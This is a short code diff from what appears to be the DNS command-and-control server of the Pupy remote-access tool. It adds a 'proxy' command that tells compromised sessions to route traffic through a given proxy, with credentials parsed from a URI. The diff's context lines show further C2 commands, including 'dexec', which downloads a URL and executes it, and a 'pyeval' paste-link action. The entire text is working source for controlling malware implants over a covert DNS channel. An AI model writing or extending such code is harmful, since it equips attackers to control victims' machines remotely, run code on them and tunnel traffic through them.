@@ -12,6 +12,8 @@ import requests
 import netifaces
 import socket
 
+from urlparse import urlparse
+
 from os import path
 
 from network.lib.igd import IGDClient, UPNPError
@@ -48,6 +50,22 @@ class PupyDnsCommandServerHandler(DnsCommandServerHandler):
 
     def exit(self, node=None, default=False):
         return self.add_command(Exit(), session=node, default=default)
+
+    def proxy(self, uri, node=None, default=False):
+        if not '://' in uri:
+            uri = 'http://' + uri
+
+        parsed = urlparse(uri)
+        return self.add_command(
+            SetProxy(
+                scheme=parsed.scheme,
+                ip=parsed.hostname,
+                port=parsed.port or 3128,
+                user=parsed.username,
+                password=parsed.password
+            ),
+            session=node, default=default
+        )
 
     def dexec(self, url, action, proxy=False, node=None, default=None):
         return self.add_command(
@@ -197,6 +215,9 @@ class PupyDnsCnc(object):
 
     def dexec(self, *args, **kwargs):
         return self.handler.dexec(*args, **kwargs)
+
+    def proxy(self, *args, **kwargs):
+        return self.handler.proxy(*args, **kwargs)
 
     def pastelink(self, content=None, url=None, action='pyeval', node=None, default=False):
         if not ( content or url ):
